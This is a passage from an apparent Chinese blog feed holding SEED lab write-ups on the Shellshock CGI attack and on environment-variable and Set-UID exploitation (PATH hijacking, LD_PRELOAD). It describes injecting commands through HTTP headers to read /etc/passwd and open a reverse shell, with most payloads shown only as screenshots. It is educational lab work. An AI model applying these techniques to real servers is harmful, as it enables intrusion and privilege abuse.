很多CGI程序都是shell脚本，所以在实际的CGI程序运行之前，会先调用一个shell程序，这样的调用是由远程计算机的用户触发的。 如果shell程序是一个易受攻击的bash程序，我们可以利用易受攻击的Shellshock获取服务器权限。</p><p>​        在我们的 Web 服务器容器中，我们已经设置了一个非常简单的 CGI 程序（称为 vul.cgi）。 它使用 shell 脚本简单地打印出“Hello World”。  CGI 程序放在 Apache 的默认 CGI 文件夹 /usr/lib/cgi-bin 中，它必须是可执行的。</p><ul><li><p>Listing 1: vul.cgi</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash shellshock</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/plain&quot;</span><br><span class="hljs-built_in">echo</span><br><span class="hljs-built_in">echo</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello World&quot;</span><br></code></pre></div></td></tr></table></figure><p>CGI 程序使用 /bin/bash shellshock（第一行），而不是使用 /bin/bash。 此行指定应调用哪个 shell 程序来运行脚本。 我们确实需要在本实验中使用易受攻击的 bash。</p></li></ul><p>要从 Web 访问 CGI 程序，我们可以使用浏览器输入以下 URL：<a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi，或者使用以下命令行程序">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi，或者使用以下命令行程序</a> curl 做同样的事。 请确保 Web 服务器容器正在运行。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">$ curl http:<span class="hljs-regexp">//</span>www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/</span>vul.cgi<br></code></pre></div></td></tr></table></figure><h2 id="3-Lab-Tasks-实验任务"><a href="#3-Lab-Tasks-实验任务" class="headerlink" title="3 Lab Tasks-实验任务"></a>3 Lab Tasks-实验任务</h2><h3 id="3-1-Task-1-Experimenting-with-Bash-Function-试验Bash函数"><a href="#3-1-Task-1-Experimenting-with-Bash-Function-试验Bash函数" class="headerlink" title="3.1 Task 1: Experimenting with Bash Function-试验Bash函数"></a>3.1 Task 1: Experimenting with Bash Function-试验Bash函数</h3><p>​        Ubuntu 20.04 中的 bash 程序已经打过补丁，所以它不再容易受到 Shellshock 攻击。 出于本实验的目的，我们在容器内（/bin 内）安装了一个易受攻击的 bash 版本。 该程序也可以在 Labsetup 文件夹中找到（内部图像 www）。 它的名字是 bash_shellshock。 我们需要在我们的任务中使用这个 bash。 您可以在容器中或直接在您的计算机上运行此 shell 程序。<br>​        请设计一个实验来验证这个 bash 是否容易受到 Shellshock 攻击。对补丁版本 /bin/bash 进行相同的实验并报告您的观察结果。</p><p><strong>实验记录</strong></p><p><img src="/2021/10/29/Shellshock/image-20211027205119366.png" alt="image-20211027205119366"></p><ul><li>这里我在容器中运行有漏洞bash版本：bash_shellshock，可以发现<code>extra</code>被输出，即额外的命令被执行了。<code>echo</code>用于显示变量，<code>declare -f</code>用于显示函数。可见bash_shellshock将分号前的部分解析为函数定义，执行了分号后的shell命令。</li></ul><p><img src="/2021/10/29/Shellshock/image-20211027205310744.png" alt="image-20211027205310744"></p><ul><li>运行补丁版本的bash，不会输出<code>extra</code>。</li></ul><h3 id="3-2-Task-2-Passing-Data-to-Bash-via-Environment-Variable-通过环境变量将数据传递给-Bash"><a href="#3-2-Task-2-Passing-Data-to-Bash-via-Environment-Variable-通过环境变量将数据传递给-Bash" class="headerlink" title="3.2 Task 2: Passing Data to Bash via Environment Variable-通过环境变量将数据传递给 Bash"></a>3.2 Task 2: Passing Data to Bash via Environment Variable-通过环境变量将数据传递给 Bash</h3><p>​        为了利用基于 bash 的 CGI 程序中的 Shellshock 漏洞，攻击者需要将他们的数据传递给易受攻击的 bash 程序，并且需要通过环境变量传递数据。 在这项任务中，我们需要了解如何实现这一目标。 我们在服务器上提供了另一个 CGI 程序 (getenv.cgi) 来帮助您识别哪些用户数据可以进入 CGI 程序的环境变量。 这个 CGI 程序打印出它所有的环境变量。</p><ul><li><p>Listing 2: getenv.cgi</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#!/bin/bash_shellshock</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Content-type: text/plain&quot;</span><br><span class="hljs-keyword">echo</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;****** Environment Variables ******&quot;</span><br>strings <span class="hljs-string">/proc/</span>$$<span class="hljs-string">/environ</span> ①<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="Task-2-A-Using-brower-使用浏览器"><a href="#Task-2-A-Using-brower-使用浏览器" class="headerlink" title="Task 2.A: Using brower-使用浏览器"></a>Task 2.A: Using brower-使用浏览器</h4><p>​        在上面的代码中，行 ①打印出当前进程中所有环境变量的内容。 通常，如果您使用浏览器访问 CGI 程序，您会看到类似以下内容。 请确定浏览器设置了哪些环境变量的值。 您可以在浏览器上打开 HTTP Header Live 扩展来捕获 HTTP 请求，并将请求与服务器打印的环境变量进行比较。 请在实验报告中包括您的调查结果。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">****** Environment Variables ******<br><span class="hljs-attribute">HTTP_HOST</span>=www.seedlab-shellshock.com<br><span class="hljs-attribute">HTTP_USER_AGENT</span>=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) <span class="hljs-built_in">..</span>.<br><span class="hljs-attribute">HTTP_ACCEPT</span>=text/html,application/xhtml+xml,application/xml;q=0.9, <span class="hljs-built_in">..</span>.<br><span class="hljs-attribute">HTTP_ACCEPT_LANGUAGE</span>=en-US,en;q=0.5<br><span class="hljs-attribute">HTTP_ACCEPT_ENCODING</span>=gzip, deflate<br><span class="hljs-built_in">..</span>.<br></code></pre></div></td></tr></table></figure><p><strong>实验记录</strong></p><p><img src="/2021/10/29/Shellshock/image-20211027225701084.png" alt="image-20211027225701084"></p><p><img src="/2021/10/29/Shellshock/image-20211027225719230.png" alt="image-20211027225719230"></p><ul><li>结论：HTTP 请求的Host、User-Agent等信息会变为环境变量。</li></ul><h4 id="Task-2-A-Using-curl-使用curl"><a href="#Task-2-A-Using-curl-使用curl" class="headerlink" title="Task 2.A: Using curl-使用curl"></a>Task 2.A: Using curl-使用curl</h4><ul><li>注：本任务可以在本机终端运行。而下列操作是在容器中自娱自乐。</li></ul><p>​        如果我们想将环境变量数据设置为任意值，我们将不得不修改浏览器的行为，那太复杂了。 幸运的是，有一个名为 curl 的命令行工具，它允许用户控制 HTTP 请求中的大部分字段。 以下是一些有用的选项： (1) -v 字段可以打印出 HTTP 请求的标头；  (2) -A, -e, -H 选项可以设置header请求中的一些字段，你需要弄清楚它们分别设置了哪些字段。 请在实验室报告中包括您的发现。 以下是有关如何使用这些字段的示例：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">$ curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>$ curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>$ curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>$ curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>根据这个实验，请描述一下curl的哪些选项可以用来将数据注入到目标CGI程序的环境变量中。</p><p><strong>实验记录</strong></p><p><img src="/2021/10/29/Shellshock/image-20211028202210186.png" alt="image-20211028202210186"></p><p><img src="/2021/10/29/Shellshock/image-20211028202303555.png" alt="image-20211028202303555"></p><p><img src="/2021/10/29/Shellshock/image-20211028202341046.png" alt="image-20211028202341046"></p><p><img src="/2021/10/29/Shellshock/image-20211028202420289.png" alt="image-20211028202420289"></p><ul><li>-A：设置用户代理（User-Agent）；</li><li>-e：设置 HTTP 的标头Referer，表示请求的来源；</li><li>-H：添加自定义的 HTTP 请求头。</li></ul><h3 id="3-3-Task-3-Launching-the-Shellshock-Attack-发起-Shellshock-攻击"><a href="#3-3-Task-3-Launching-the-Shellshock-Attack-发起-Shellshock-攻击" class="headerlink" title="3.3 Task 3: Launching the Shellshock Attack-发起 Shellshock 攻击"></a>3.3 Task 3: Launching the Shellshock Attack-发起 Shellshock 攻击</h3><p>​        我们现在可以发起 Shellshock 攻击。 攻击不依赖于 CGI 程序中的内容，因为它针对的是 bash 程序，该程序在执行实际 CGI 脚本之前被调用。 你的工作是通过 URL <a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a> 发起攻击，这样你就可以让服务器运行任意命令。</p><p>​        如果您的命令有纯文本输出，并且您希望输出返回给您，则您的输出需要遵循一个协议：它应该以 Content type: text/plain 开头，后跟一个空行，然后您可以放置您的 纯文本输出。 例如，如果您希望服务器返回其文件夹中的文件列表，您的命令将如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> Content_type: text/plain; <span class="hljs-built_in">echo</span>; /bin/ls -l<br></code></pre></div></td></tr></table></figure><h4 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h4><ul><li><p>Get the server to send back the content of the /etc/passwd file.</p></li><li><p>让服务器发回 /etc/passwd 文件的内容。</p></li><li><p>这里使用 -A</p><p><img src="/2021/10/29/Shellshock/image-20211029191336688.png" alt="image-20211029191336688"></p></li></ul><h4 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B:"></a>Task 3.B:</h4><ul><li><p>Get the server to tell you its process’ user ID. You can use the /bin/id command to print out the ID information.</p></li><li><p>让服务器告诉你它的进程的用户 ID。 您可以使用 /bin/id 命令打印出 ID 信息。</p></li><li><p>这里使用 -e</p><p><img src="/2021/10/29/Shellshock/image-20211029191430634.png" alt="image-20211029191430634"></p></li></ul><h4 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C:"></a>Task 3.C:</h4><ul><li><p>Get the server to create a file inside the /tmp folder. You need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</p></li><li><p>让服务器在 /tmp 文件夹中创建一个文件。 需要进入容器查看文件是否创建，或者使用另一个Shellshock攻击列出/tmp文件夹。</p></li><li><p>这里使用 -H</p><p><img src="/2021/10/29/Shellshock/image-20211029191612100.png" alt="image-20211029191612100"></p><ul><li>图例中，创建的文件为file。</li></ul></li></ul><h4 id="Task-3-D"><a href="#Task-3-D" class="headerlink" title="Task 3.D"></a>Task 3.D</h4><ul><li><p>Get the server to delete the file that you just created inside the /tmp folder.</p></li><li><p>让服务器删除您刚刚在 /tmp 文件夹中创建的文件。</p><p><img src="/2021/10/29/Shellshock/image-20211028193124293.png" alt="image-20211028193124293"></p></li></ul><h4 id="Questions-问题"><a href="#Questions-问题" class="headerlink" title="Questions-问题"></a>Questions-问题</h4><ul><li><p>问题 1：你能从服务器窃取影子文件 /etc/shadow 的内容吗？为什么或者为什么不？ 在Task 3.B 中获得的信息应该会给你一个线索。</p><ul><li>答：不能。因为打开/etc/shadow需要root权限。从Task 3.B中我们可以知道当前用户id为33，并非root。</li></ul></li></ul><ul><li><p>问题 2：HTTP GET 请求通常在 URL 中附加数据，在 ? 标记后。 这可能是我们可以用来发起攻击的另一种方法。 在下面的例子中，我们在URL中附加了一些数据，我们发现这些数据是用来设置如下环境变量的：  </p><figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl">$ curl &quot;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA&quot;<br><span class="hljs-meta prompt_">...</span><br>UERY_STRING=AAAAA<br><span class="hljs-meta prompt_">...</span><br></code></pre></div></td></tr></table></figure><p>我们可以使用这种方法来发起 Shellshock 攻击吗？ 请进行您的实验并根据您的实验结果得出您的结论。</p><ul><li><p>不能。因为空格在URL中需要被转义，而函数定义的左大括号前后都需要有一个空格，否则整个字符串无法被解析。</p><p><img src="/2021/10/29/Shellshock/image-20211028202607706.png" alt="image-20211028202607706"></p></li></ul></li></ul><h3 id="3-4-Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack-通过-Shellshock-攻击获取反向-Shell"><a href="#3-4-Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack-通过-Shellshock-攻击获取反向-Shell" class="headerlink" title="3.4 Task 4: Getting a Reverse Shell via Shellshock Attack-通过 Shellshock 攻击获取反向 Shell"></a>3.4 Task 4: Getting a Reverse Shell via Shellshock Attack-通过 Shellshock 攻击获取反向 Shell</h3><p>​        Shellshock 漏洞允许攻击者在目标机器上运行任意命令。 在真正的攻击中，攻击者通常选择运行一个 shell 命令，而不是对攻击中的命令进行硬编码，因此他们可以使用这个 shell 运行其他命令，只要 shell 程序还活着。 为了实现这一目标，攻击者需要运行一个反向 shell。</p><p>​        反向 shell 是在机器上启动的 shell 进程，其输入和输出由远程计算机的某个人控制。 基本上，shell 在受害者的机器上运行，但它从攻击者的机器上获取输入，并将其输出打印在攻击者的机器上。 反向 shell 为攻击者提供了一种在受感染机器上运行命令的便捷方式。 可以在 SEED 书中找到有关如何创建反向 shell 的详细说明。 在此任务中，您需要演示如何使用 Shellshock 攻击从受害者那里获取反向 shell。</p><p><strong>实验记录</strong></p><ul><li><p>打开攻击者的9090端口进行监听。</p><p><img src="/2021/10/29/Shellshock/image-20211028204828593.png" alt="image-20211028204828593"></p></li><li><p>查看攻击者TCP服务器的ip地址：10.9.0.1。</p><p><img src="/2021/10/29/Shellshock/image-20211028204752710.png" alt="image-20211028204752710"></p></li><li><p>实行shellshock攻击</p><p><img src="/2021/10/29/Shellshock/image-20211028205621956.png" alt="image-20211028205621956"></p></li><li><p>成功创建反向shell</p><p><img src="/2021/10/29/Shellshock/image-20211028205559402.png" alt="image-20211028205559402"></p></li></ul><h3 id="3-5-Task-5-Using-the-Patched-Bash-任务-5：使用修补的-Bash"><a href="#3-5-Task-5-Using-the-Patched-Bash-任务-5：使用修补的-Bash" class="headerlink" title="3.5 Task 5: Using the Patched Bash-任务 5：使用修补的 Bash"></a>3.5 Task 5: Using the Patched Bash-任务 5：使用修补的 Bash</h3><p>​        现在，让我们使用一个已经打过补丁的 bash 程序。 程序 <code>/bin/bash</code> 是一个补丁版本。 请用这个程序替换 CGI 程序的第一行。 重做任务 3 并描述您的观察结果。</p><p><strong>实验记录</strong></p><ul><li>image_www下新建vul1.cgi，名称加入Dockerfile，重新搭建容器。</li></ul><p><img src="/2021/10/29/Shellshock/image-20211028210530090.png" alt="image-20211028210530090"></p><p><img src="/2021/10/29/Shellshock/image-20211028213149416.png" alt="image-20211028213149416"></p><ul><li><p>重新执行Task3中的命令，发现输出Hello World。</p><p><img src="/2021/10/29/Shellshock/image-20211028213255481.png" alt="image-20211028213255481"></p></li><li><p>故无法攻击修复后的bash</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>软件安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全实验</tag>
      
      <tag>计算机安全导论</tag>
      
      <tag>SeedUbuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Environment Variable and Set-UID Program Lab</title>
    <link href="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/"/>
    <url>/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Variable-and-Set-UID-Program-Lab"><a href="#Environment-Variable-and-Set-UID-Program-Lab" class="headerlink" title="Environment Variable and Set-UID Program Lab"></a><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Environment_Variable_and_SetUID/">Environment Variable and Set-UID Program Lab</a></h1><h2 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h2><ul><li>使用 printenv 或 env 命令打印出环境变量。 如果您对某些特定的环境变量（例如 PWD）感兴趣，可以使用“printenv PWD”或“env | grep PWD”。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/202112042118596.png" alt="image-20211020145822500"></p><ul><li>如果您对某些特定的环境变量（例如 PWD）感兴趣，可以使用“printenv PWD”或“env | grep PWD”。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020145903437.png" alt="image-20211020145903437"></p><ul><li>使用 export 和 unset 来设置或取消设置环境变量。 需要注意的是，这两个命令不是单独的程序； 它们是 Bash 的两个内部命令（您将无法在 Bash 之外找到它们）。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020150046782.png" alt="image-20211020150046782"></p><h2 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h2><ul><li>Step1：编译并运行以下程序</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020151247295.png" alt="image-20211020151247295"></p><ul><li>这将生成一个名为 a.out 的二进制文件。 让我们运行它并使用“a.out &gt; file”将输出保存到一个文件中。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020151339380.png" alt="image-20211020151339380"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020151502197.png" alt="image-20211020151502197"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020151557465.png" alt="image-20211020151557465"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020151921417.png" alt="image-20211020151921417"></p><p>diff命令没有输出，表示内容相同。</p><h2 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and execve()</h2><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020152709997.png" alt="image-20211020152709997"></p><ul><li>Step1：这个程序只是执行一个名为/usr/bin/env 的程序，它打印出当前进程的环境变量。发现执行结果为空。</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * filename，<span class="hljs-type">char</span> * <span class="hljs-type">const</span> argv[]，<span class="hljs-type">char</span> * <span class="hljs-type">const</span> envp[])</span><br></code></pre></div></td></tr></table></figure><ul><li>第一个参数为一个可执行的有效的路径名。第二个参数argv系利用数组指针来传递给执行文件，v是要调用的程序执行的参数序列，也就是我们要调用的程序需要传入的参数；envp则为传递给执行文件的新环境变量数。</li><li>所以在此处，我们赋予新进程的环境变量为空，自然印出环境变量结果为空。</li><li>Step2：将第①行中 execve() 的调用更改为以下内容； 描述你的观察。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020153026820.png" alt="image-20211020153026820"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020153311871.png" alt="image-20211020153311871"></p><ul><li>结论：execve()产生的新进程的环境变量需要在调用时进行传递。</li></ul><h2 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and system()</h2><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020154103500.png" alt="image-20211020154103500"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-built_in">string</span>)</span><br></code></pre></div></td></tr></table></figure><p>system()调用fork()函数新建一个子进程；在子进程中调用execl()函数去执行command；在父进程中调用wait去等待子进程结束。</p><h2 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h2><ul><li>Step1:编写程序，可以打印出当前进程中的所有环境变量</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020224003336.png" alt="image-20211020224003336"></p><ul><li>Step2:编译上述程序，将其所有权改为root，并使其成为Set-UID程序。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020224014380.png" alt="image-20211020224014380"></p><ul><li>Step3:在您的 shell 中（您需要使用普通用户帐户，而不是 root 帐户），使用 export 命令设置以下环境变量（它们可能已经存在）：</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021100901489.png" alt="image-20211021100901489"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021100901489.png" alt="image-20211021100901489"></p><ul><li><p>找不到<strong>LD_LIBRARY_PATH</strong>（主要用于指定查找共享库（动态链接库）时除了默认路径之外的其他路径）：</p><p>为了使 Set-UID 程序更加安全，不受LD_LIBRARY_PATH环境变量的影响。如果程序是个 Set-UID 程序 ，运行时的链接器或加载器（ld.so）会忽略该环境变量，</p></li></ul><h2 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h2><ul><li>新建并编译所给程序task6.c和恶意程序fake_ls.c</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020234105932.png" alt="image-20211020234105932"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020235045011.png" alt="image-20211020235045011"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211020235045011.png" alt="image-20211020235045011"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021104619050.png" alt="image-20211021104619050"></p><ul><li>将task6设置为setuid程序</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021103533207.png" alt="image-20211021103533207"></p><ul><li>查看当前目录的路径，通过export设置PATH先查找当前目录。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021103317949.png" alt="image-20211021103317949"></p><ul><li>将 /bin/sh 链接到另一个没有防止攻击的对策的 shell；编译生成自己的ls，运行task6。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021104005806.png" alt="image-20211021104005806"></p><h2 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h2><p><strong>Step1:</strong></p><ul><li>构建一个动态链接库。 创建以下程序，并将其命名为 mylib.c</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021110714056.png" alt="image-20211021110714056"></p><ul><li><p>使用以下命令编译上面的程序：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021111108716.png" alt="image-20211021111108716"></p></li><li><p>现在，设置 LD_PRELOAD 环境变量：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021164256576.png" alt="image-20211021164256576"></p></li><li><p>最后编译下面的程序myprog，和上面的动态链接库libmylib.so.1.0.1在同一个目录下：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021164338809.png" alt="image-20211021164338809"></p></li></ul><p><strong>Step2</strong>:完成上述操作后，请在以下条件下运行 myprog，并观察会发生什么。</p><ul><li><p>使myprog 成为常规程序，并以普通用户身份运行它。</p><p>会执行我们设定的库中的sleep函数，输出字符串。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021164407880.png" alt="image-20211021164407880"></p></li><li><p>使myprog 成为Set-UID root 程序，并以普通用户身份运行它。</p><p>正常执行程序，sleep 1秒，然后退出程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021164659198.png" alt="image-20211021164659198"></p></li><li><p>使myprog 成为Set-UID root 程序，再次在root 用户中设置LD_RELOAD 环境变量，然后运行它。</p><p>首先登入root用户，设置LD_PRELOAD 环境变量：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021165141482.png" alt="image-20211021165141482"></p><ul><li><p>以root用户运行：</p><p>会执行我们设定的库中的sleep函数，输出字符串。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021165313056.png" alt="image-20211021165313056"></p></li><li><p>以普通用户运行：</p><p>正常执行程序，sleep 1秒，然后退出程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021165406084.png" alt="image-20211021165406084"></p></li></ul></li><li><p>使 myprog 成为 Set-UID user1 程序（即所有者是 user1，这是另一个用户帐户），在不同用户的帐户（非 root 用户）中再次导出 LD PRELOAD 环境变量并运行它。</p><ul><li>首先新建用户user1：</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021165729604.png" alt="image-20211021165729604"></p><ul><li>设置程序的所有者为user1，并设置为Set-UID程序，并设置环境变量</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021165838025.png" alt="image-20211021165838025"></p><ul><li><p>以seed用户运行该程序：</p><p>正常执行程序，sleep 1秒，然后退出程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021165939108.png" alt="image-20211021165939108"></p></li></ul></li><li><p><strong>Step3</strong>：</p><p>设计一个实验来找出并解释Step2中的行为不同的原因。</p><ul><li><p>编写并编译程序：print_env，通过改变注释行可以分别打印子进程的环境变量和父进程的环境变量。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021214959424.png![image-20211021215250109](软件安全Lab1/image-20211021215250109.png" alt="image-20211021214959424"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021215130804.png" alt="image-20211021215130804"></p><p>①程序为常规程序。以seed用户更改环境变量，执行程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021220918021.png" 